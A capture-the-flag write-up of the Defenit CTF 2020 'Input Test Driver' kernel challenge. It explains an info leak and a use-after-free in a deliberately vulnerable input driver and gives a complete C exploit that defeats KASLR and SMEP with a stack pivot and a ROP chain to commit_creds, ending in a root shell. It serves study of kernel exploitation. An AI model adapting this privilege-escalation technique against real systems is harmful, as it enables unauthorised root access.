+++
title = "Defenit CTF 2020 - Input Test Driver"
date = "2025-09-15"
description = "Defenit CTF 2020 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "linux kernel", "out of bound", "uaf", "kernel stack pivoting"]
+++

## 0x00. Introduction
``` bash
qemu-system-x86_64 \
-m 64M \
-kernel ./bzImage \
-initrd ./tmp/"$ROOTFS_NAME".cpio  \
-append 'root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr' \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
-cpu qemu64,smep \
-smp 1 \
```

KASLR and SMEP are enabled.

The source code and intended solution are available on the author's [github](https://github.com/V4bel/2020_defenit_ctf).

### Concept
This mimics an **input device driver** that connects user input devices like keyboard and mouse to the kernel.
For example, when a specific key is pressed on the keyboard hardware:

1. The driver identifies the key by scan code
2. Reports it by generating an event to the Linux Input Subsystem
3. Exposes it through device files like `/dev/input/eventX`

User space reads the `/dev/input/eventX` device file and translates it into actual actions.


## 0x01. Vulnerability
### Info Leak
``` c
static int report_touch_press(char *start, int len) {
    int i;

    if(!len) {
        printk("len error");
        return -1;
    }

    for(i=0; i<=len; i++) {                             // 1-byte oob
        input_report_key(test_dev, BTN_TOUCH, 1);
        input_report_abs(test_dev, ABS_X, *(char *)(start+i));
        input_report_abs(test_dev, ABS_Y, *(char *)(start+i));
        input_sync(test_dev);
    }

    return 0;
}
...
static long input_test_driver_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {

    switch(cmd) {
        case 0x1337:
            printk("report_touch_press call");
            mutex_lock(&test_mutex);

            if(!_fp) {
                _fp = kzalloc(sizeof(struct fp_struct), GFP_ATOMIC);
                _fp->fp_report_ps = report_touch_press;
                _fp->fp_report_rl = report_touch_release;
                _fp->gift = printk;
                _fp->gift("_fp class allocate");
            }

            _fp->fp_report_ps(ptr, strlen(ptr));        // use strlen() to return length

            mutex_unlock(&test_mutex);

            break;
    ...
    }
    ...
}
```

`input_test_driver_ioctl()` is called internally in the kernel when user space calls `ioctl()` on this driver.
Calling `ioctl()` with `cmd` set to `0x1337` initializes the structure if `_fp` doesn't exist and calls `fp_report_ps()`.

`report_touch_press()` and `report_touch_release()` detect touchscreen press and release events respectively.
At this point, the second argument `len` receives `strlen(ptr)`.
Then the length until `ptr` encounters `NULL` is passed to `len`, so filling all `\x00`s enables leaking subsequent memory.

This alone seems sufficient, but there's also a 1-byte OOB inside `report_touch_press()` due to checking range with `for(i=0; i<=len; i++)`.

### Use After Free
``` c
static ssize_t input_test_driver_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) {
    char *result;
    size_t len;

    mutex_lock(&test_mutex);

    if(ptr) {
        kfree(ptr);                                     // ptr still pointing slab chunk
    }

    if(count<256) {
        len = count;
        count = 256;
    } else if(count>0x40000) {
        len = 416;
    } else {
        len = count;
    }

    if(result = (char *)kmalloc(count, GFP_ATOMIC))     // fails if count is too big
        ptr = result;                                   // dangling pointer!

    if (copy_from_user(ptr, buf, len) != 0) {
        mutex_unlock(&test_mutex);
        return -EFAULT;
    }

    mutex_unlock(&test_mutex);

    return 0;
}
```

`input_test_driver_write()` is called internally when user space calls `write()` on this driver.

The problem is that when `ptr` is not `NULL`, it frees and reallocates the region `ptr` is pointing at, but doesn't initialize `ptr`.
Instead, it allocates a new slab object and assigns the address to `ptr`, creating another vulnerability.

When the kernel's `kmalloc()` requests a too large slab object, the allocation fails and returns `NULL`.
If `result` is `NULL`, `ptr` doesn't get updated, leaving the freed `ptr` as a dangling pointer.


## 0x02. Exploit
### Info Leak
Before proceeding with exploitation, reviewing the protections: SMEP requires kernel ROP, but KASLR requires obtaining the kernel base address.

``` c
static struct fp_struct {
    char dummy[392];
    asmlinkage int (*gift)(const char *, ...);
    int (*fp_report_ps)(char *, int);
    int (*fp_report_rl)(void);
};
```

Obviously, the variable name `fp_struct->gift` contains the address of the `printk()` function.
Therefore, filling `dummy` completely exploits the info leak vulnerability using `strlen()` for length measurement, printing up to the address stored in `gift`.

``` c
static int input_test_driver_release(struct inode *inode, struct file *file) {
    printk("input_test_driver release");

    mutex_lock(&test_mutex);

    if(ptr) {
        kfree(ptr);
        ptr = 0;
    }

    if(_fp) {
        kfree(_fp);
        _fp = 0;
    }

    mutex_unlock(&test_mutex);

    return 0;
}
```

Looking at `input_test_driver_release()` which is called on closing the file descriptor opened for driver communication, it frees and initializes both `ptr` and `_fp`.

However, since data inside the slab object isn't cleared, allocating a `ptr` of similar size to the freed `_fp` reuses the freed region.

``` c
    fd1 = open("/dev/input/event2", O_RDONLY);
    fd2 = open("/dev/input_test_driver", O_RDWR);
    
    write(fd2, "AAAAAAAA", 8);          // kernel panic if there is no ptr
    ioctl(fd2, 0x1337, NULL);
    close(fd2);

    fd2 = open("/dev/input_test_driver", O_RDWR);
    memset(payload, 0x42, 392);
    write(fd2, payload, 392);

    ioctl(fd2, 0x1337, NULL);
```

Allocating `_fp` through `ioctl()` and closing moves `_fp` to the `kmalloc-512` cache since the slab object size is 416 bytes.
Attempting to allocate a 392-byte slab object to avoid overwriting `printk()`'s address returns an object from the `kmalloc-512` cache.

Filling 392 bytes with a non-zero value (0x42) makes `strlen()` measure length until encountering `NULL`, leaking `printk()`'s address.

``` bash
/ $ ./exp
type: 1, code: 330, value: 0x1 
type: 3, code: 0, value: 0x41 
type: 3, code: 1, value: 0x41 
type: 0, code: 0, value: 0x0 
type: 3, code: 0, value: 0x0 
type: 3, code: 1, value: 0x0 
type: 0, code: 0, value: 0x0 
type: 3, code: 0, value: 0x42 
type: 3, code: 1, value: 0x42 
type: 0, code: 0, value: 0x0 
type: 3, code: 0, value: 0x20 
type: 3, code: 1, value: 0x20 
type: 0, code: 0, value: 0x0 
type: 3, code: 0, value: 0xb8 
type: 3, code: 1, value: 0xb8 
type: 0, code: 0, value: 0x0 
type: 3, code: 0, value: 0xae 
type: 3, code: 1, value: 0xae 
type: 0, code: 0, value: 0x0 
type: 3, code: 0, value: 0xb3 
type: 3, code: 1, value: 0xb3 
leak : 0xffffffffb3aeb820
```

### Use After Free
After triggering the UAF vulnerability, `ptr` becomes a dangling pointer to a freed slab object.
If this slab object is in the `kmalloc-512` cache, allocating `_fp` through `ioctl()` returns that object.

``` c
static ssize_t input_test_driver_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) {
    ...
    if(count<256) {
        len = count;
        count = 256;
    } else if(count>0x40000) {
        len = 416;
    } else {
        len = count;
    }

    if(result = (char *)kmalloc(count, GFP_ATOMIC))
        ptr = result;

    if (copy_from_user(ptr, buf, len) != 0) {
        mutex_unlock(&test_mutex);
        return -EFAULT;
    }
    ...
}
```

This makes `ptr` and `_fp` point to the same slab object. Even if `kmalloc()` fails due to large `size`, `copy_from_user()` is still executed, allowing us to overwrite `_fp`'s function pointers.

``` c
    fd2 = open("/dev/input_test_driver", O_RDWR);
    memset(payload, 0x43, 392);
    write(fd2, payload, 416);
    write(fd2, payload, 0x500000);

    ioctl(fd2, 0x1337, NULL);

    *(uint64_t *)(payload + 408) = xchg_64;
    write(fd2, payload, 0x510000);

    ioctl(fd2, 0x7331, NULL);
```

The exploitation flow:

1. Allocate 416-byte slab object through `write()`
2. Call `write()` again to:
   - Free existing slab object, moving to `kmalloc-512`
   - Intentionally request large object size to fail update
3. Allocate `_fp` through `ioctl()`, receiving slab object from `kmalloc-512`
4. Final `write()` call overwrites function pointer while writing 416 bytes to `ptr` (i.e., `_fp`)

Since we can only control RIP by changing function pointers, we can deliver a ROP payload using an `xchg eax, esp` gadget and fake stack.

## 0x03. Payload
``` c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/mman.h>
#include <linux/input.h>

void shell() {
    execl("/bin/sh", "sh", NULL);
}

struct register_val {
    uint64_t user_rip;
    uint64_t user_cs;
    uint64_t user_rflags;
    uint64_t user_rsp;
    uint64_t user_ss;
} __attribute__((packed));

struct register_val rv;

void backup_rv(void) {
    asm("mov rv+8, cs;"
        "pushf; pop rv+16;"
        "mov rv+24, rsp;"
        "mov rv+32, ss;"
       );
    rv.user_rip = &shell;
}

void set_fake_stack(void *xchg_64) {
    uint32_t xchg_32;
    int i = 0;

    size_t pop_rdi_ret = xchg_64 + 0x6170f;
    size_t prepare_kernel_cred = xchg_64 + 0x8fe8f;
    size_t pop_rcx_ret = xchg_64 + 0x285312;
    size_t mov_rdi_rax_rep_pop_rbp_ret = xchg_64 + 0xf2ee;
    size_t commit_creds = xchg_64 + 0x8fadf;
    size_t swapgs_pop_rbp_ret = xchg_64 + 0x4c103;
    size_t iretq = xchg_64 + 0x2bc4f;
    
    xchg_32 = (uint32_t)xchg_64;
    mmap((void *)(xchg_32), 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    backup_rv();

    ((uint64_t *)xchg_32)[i++] = pop_rdi_ret;
    ((uint64_t *)xchg_32)[i++] = 0;
    ((uint64_t *)xchg_32)[i++] = prepare_kernel_cred;
    ((uint64_t *)xchg_32)[i++] = pop_rcx_ret;
    ((uint64_t *)xchg_32)[i++] = 0;
    ((uint64_t *)xchg_32)[i++] = mov_rdi_rax_rep_pop_rbp_ret;
    ((uint64_t *)xchg_32)[i++] = 0; // for pop rbp
    ((uint64_t *)xchg_32)[i++] = commit_creds;
    ((uint64_t *)xchg_32)[i++] = swapgs_pop_rbp_ret;
    ((uint64_t *)xchg_32)[i++] = 0; // for pop rbp
    ((uint64_t *)xchg_32)[i++] = iretq;
    ((uint64_t *)xchg_32)[i++] = rv.user_rip;
    ((uint64_t *)xchg_32)[i++] = rv.user_cs;
    ((uint64_t *)xchg_32)[i++] = rv.user_rflags;
    ((uint64_t *)xchg_32)[i++] = rv.user_rsp;
    ((uint64_t *)xchg_32)[i++] = rv.user_ss;
}

int main() {
    struct input_event ie;
    int fd1, fd2, ret;
    char payload[416];
    size_t leak = 0xffffffff00000000;
    int i = 0, flag = 0;
    size_t xchg_64;
    
    fd1 = open("/dev/input/event2", O_RDONLY);
    fd2 = open("/dev/input_test_driver", O_RDWR);
    
    // step 1 : leak kernel base address
    write(fd2, "AAAAAAAA", 8);
    ioctl(fd2, 0x1337, NULL);
    close(fd2);

    fd2 = open("/dev/input_test_driver", O_RDWR);
    memset(payload, 0x42, 392);
    write(fd2, payload, 392);

    ioctl(fd2, 0x1337, NULL);
    
    while(1) {
        read(fd1, &ie, sizeof(struct input_event));
        printf("type: %d, code: %d, value: 0x%x \n", ie.type, ie.code, (unsigned char)ie.value);
        if(ie.code == 1 && ie.value == 0x20 || ie.code == 1 && flag) {
            leak = leak | (unsigned char)(ie.value) << (flag * 8);
            flag++;
            if(flag == 4)
                break;
        }
    }
    // step 2 : calculate the address of xchg_64
    printf("leak : 0x%lx\n", leak);
    xchg_64 = leak - 0xcdd5f;
    printf("xchg_64 : 0x%lx\n", xchg_64);

    close(fd1);
    close(fd2);

    // step 3 : set fake stack
    set_fake_stack(xchg_64);

    // step 4 : overwrite function pointer
    fd2 = open("/dev/input_test_driver", O_RDWR);
    memset(payload, 0x43, 392);
    write(fd2, payload, 416);
    write(fd2, payload, 0x500000);

    ioctl(fd2, 0x1337, NULL);

    *(uint64_t *)(payload + 408) = xchg_64;
    write(fd2, payload, 0x510000);

    ioctl(fd2, 0x7331, NULL);

    close(fd2);
    return 0;
}
```